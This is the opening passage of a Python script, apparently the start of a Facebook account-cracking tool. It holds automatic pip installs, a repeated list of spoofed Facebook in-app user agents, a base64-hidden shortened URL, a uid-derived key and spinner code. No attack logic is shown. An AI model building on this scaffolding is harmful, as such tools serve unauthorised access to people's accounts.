#---[ CODE BY - DARK_LMNx9 ]---

#-----[ modules ]-----#

import os,sys,time,json,string,random
import itertools,threading,signal,re
from rich import print as python3
from rich import print_json as js
print('\n \033[1;32m[✓] installing Modules !...\n')
try:
    import requests
except ImportError:
    print('\n \033[1;34m[✓] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n\033[1;32m [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;35m[✓] installing bs4 !...\n')
    os.system('pip install bs4')
try:
    import mechanize
except ImportError:
    print('\n \033[1;34m[✓] installing Mechanize !...\n')
    os.system('pip install mechanize')
try:import httpx
except:os.system('pip install httpx')
try:import colorama
except:os.system('pip install colorama')
try:import rich
except:os.system('pip install rich')
try:import shutil
except:os.system('pip install shutil')
from colorama import Fore,Style
import rich,requests,colorama
import httpx,shutil,base64,uuid
import bs4
import requests
import mechanize
from os import system
from time import sleep
import requests as ress
from sys import exit as exit
from random import randint
from random import choice as pilih
from random import random as acak
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#-----[ assest ]-----#

GG='\x1b[38;5;48m'
GG1='\x1b[38;5;47m'
GG2='\x1b[38;5;46m'
GG3='\x1b[38;5;46m'
G='\x1b[38;5;204m'
G1='\x1b[38;5;205m'
G2='\x1b[38;5;206m'
G3='\x1b[38;5;207m'
G4='\x1b[38;5;201m'
GX='\x1b[38;5;203m'
GY='\x1b[38;5;202m'
bl="\033[1;30m"
r="\033[1;31m"
gr="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
sk="\033[1;36m"
w="\033[1;37m"
g='\x1b[38;5;40m'
g1='\x1b[38;5;41m'
g2='\x1b[38;5;42m'
g3='\x1b[38;5;43m'
g4='\x1b[38;5;44m'
g='\033[38;5;46m'
r='\033[38;5;196m'
z='\033[38;5;203m'
i='\033[38;5;57m'
ii='\033[38;5;56m'
iii='\033[38;5;55m'
iiii='\033[38;5;54m'
y='\033[38;5;208m'
b='\033[38;5;45m'
l='\033[38;5;49m'
x='\033[38;5;65m'
o='\x1b[1;0m'

ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.",]
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X680D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",]

K1=str(os.getuid())
K2=str(os.getgid())
num_key="h".join(K1+K2)
url=base64.b64decode(b'aHR0cHM6Ly9zaG9ydHVybC5hdC9SVHNaVA==')
cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr)
main_url=url.decode("ASCII")
kx=cm2.replace("b","LMNx9")
key=kx.upper()

COLOR_DEFAULT=Style.RESET_ALL
COLOR_BLUE=Fore.BLUE
COLOR_MAGENTA=Fore.MAGENTA
COLOR_CYAN=Fore.CYAN
COLOR_GREEN=Fore.GREEN
COLOR_RED=Fore.RED
COLOR_YELLOW=Fore.YELLOW
ICON="• "

ARRAY_ANIMATION=[    f"{COLOR_BLUE}{ICON}{COLOR_GREEN}{ICON}{COLOR_YELLOW}{ICON}{COLOR_RED}{ICON}{COLOR_MAGENTA}{ICON}    ",
    f" {COLOR_GREEN}{ICON}{COLOR_YELLOW}{ICON}{COLOR_RED}{ICON}{COLOR_MAGENTA}{ICON}{COLOR_BLUE}{ICON}   ",
    f"  {COLOR_RED}{ICON}{COLOR_MAGENTA}{ICON}{COLOR_YELLOW}{ICON}{COLOR_BLUE}{ICON}{COLOR_GREEN}{ICON}  ",
    f"   {COLOR_MAGENTA}{ICON}{COLOR_BLUE}{ICON}{COLOR_GREEN}{ICON}{COLOR_YELLOW}{ICON}{COLOR_RED}{ICON} ",
    f"    {COLOR_BLUE}{ICON}{COLOR_GREEN}{ICON}{COLOR_RED}{ICON}{COLOR_YELLOW}{ICON}{COLOR_MAGENTA}{ICON}"
]
class LMNx9_Spinner:
    def __init__(self, message):
        self.message=message
        self.stop_running=False
        self.thread=None
        self.animation_cycle=itertools.cycle(ARRAY_ANIMATION)
        self.columns=shutil.get_terminal_size().columns
    def start(self):
        self.stop_running=False
        self.thread=threading.Thread(target=self._animate)
        self.thread.start()
    def _animate(self):
        while not self.stop_running:
            sys.stdout.write(f"\r{self.message} {next(self.animation_cycle)}")
            sys.stdout.flush()
            time.sleep(0.5)
    def stop(self, exit_status):
        self.stop_running=True
        if self.thread is not None:
            self.thread.join()      
        sys.stdout.write("\r" + " " * self.columns + "\r")
        sys.stdout.flush()
LMNx9_Spinner=LMNx9_Spinner(f"[*] Tool Starting")

def lood():
    LMNx9_Spinner.start()
    time.sleep(4) 
    LMNx9_Spinner.stop(0)

def load(word):
    lix=['/', '-', '\\', '|']
    for i in range(7):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.4)
            sys.stdout.flush()

def load_op(word):
    lix=['/', '-', '\\', '|']
    for i in range(40):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.09)
            sys.stdout.flush()
            
def linex():
    python3(f"[bold purple]     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
